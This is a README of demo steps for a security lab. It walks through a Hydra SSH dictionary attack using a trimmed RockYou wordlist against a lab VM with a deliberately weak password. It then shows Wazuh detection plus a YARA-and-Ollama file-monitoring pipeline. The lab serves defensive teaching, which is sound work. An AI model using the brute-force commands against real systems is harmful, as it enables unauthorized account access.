# Demo Steps

This document describes how to reproduce both security scenarios implemented in this laboratory.

---

# Environment

## Virtual Machines

- Kali Linux (Attack Machine)
- Ubuntu Agent (Monitored Endpoint)
- Wazuh Server (SIEM + Ollama)

---

# Scenario 1 – SSH Dictionary Attack

## Step 1 – Configure a weak password

On the Ubuntu Agent:

```bash
sudo passwd rado
```

Password used during the demonstration:

```text
qwerty1
```

> Note: A weak password is intentionally used for educational purposes only.

---

## Step 2 – Prepare a smaller RockYou dictionary

If rockyou.txt is compressed:

```bash
cp /usr/share/wordlists/rockyou.txt.gz .
```

Copy the original wordlist to the current directory.

Next:

```bash
gunzip rockyou.txt.gz
```

Extract the archive.

Finally:

```bash
head -n 5000 rockyou.txt > small.txt
```

Create a smaller dictionary containing the first 5000 passwords.

---

## Step 3 – Verify the password position (optional)

```bash
grep -n "qwerty1" small.txt
```

This command shows where the demonstration password is located inside the dictionary.

---

## Step 4 – Launch the dictionary attack

```bash
hydra -I -V -l rado -P small.txt -t 4 -f ssh://192.168.25.142
```

The options mean:

- `-I` Ignore previous Hydra sessions.
- `-V` Display every login attempt.
- `-l rado` Username.
- `-P small.txt` Password dictionary.
- `-t 4` Maximum of four parallel SSH connections.
- `-f` Stop after finding the correct password.

Expected result:

Hydra discovers the correct SSH password.

---

## Step 5 – Verify Linux authentication logs

On Ubuntu Agent:

```bash
sudo grep "Accepted password" /var/log/auth.log
```

or

```bash
sudo tail -n 30 /var/log/auth.log
```

Review both failed authentication attempts and the successful login.

---

## Step 6 – Review Wazuh Dashboard

Typical alerts include:

- User authentication failure
- Multiple authentication failures
- Maximum authentication attempts exceeded
- PAM: Login session opened
---

# Scenario 2 – File Integrity Monitoring with YARA and Ollama

This scenario demonstrates how Wazuh can automatically analyze a newly created file using YARA and a locally hosted AI model.

## Step 1 – Prepare the Active Response script

On Ubuntu Agent:

```bash
sudo cp /var/ossec/active-response/bin/yara_scan.sh /var/ossec/active-response/bin/yara_ollama.sh
```

This creates a copy of the original Active Response script.

Edit the script:

```bash
sudo nano /var/ossec/active-response/bin/yara_ollama.sh
```

Verify permissions:

```bash
sudo chmod 750 /var/ossec/active-response/bin/yara_ollama.sh
sudo chown root:wazuh /var/ossec/active-response/bin/yara_ollama.sh
```

Verify Bash syntax:

```bash
sudo bash -n /var/ossec/active-response/bin/yara_ollama.sh
```

---

## Step 2 – Clear previous logs

```bash
sudo truncate -s 0 /var/ossec/logs/active-responses.log
```

This removes previous Active Response entries, making the new execution easier to analyze.

---

## Step 3 – Create the EICAR test file

```bash
echo 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE' > /home/rado/wazuh-fim-test/final-eicar-ai.txt
```

Creating the file triggers File Integrity Monitoring (FIM).

---

## Step 4 – Automatic pipeline

After the file is created:

1. Wazuh FIM detects the file creation.
2. Active Response executes the custom Bash script.
3. YARA scans the file.
4. The detection result is sent to Ollama using its REST API.
5. Ollama generates an AI-assisted security analysis.
6. The analysis is written into the Active Response log.

---

## Step 5 – Review the results

```bash
sudo tail -n 50 /var/ossec/logs/active-responses.log
```

Expected output includes:

- ACTIVE RESPONSE started
- YARA detection
- Ollama request
- Ollama raw response
- AI-generated security analysis
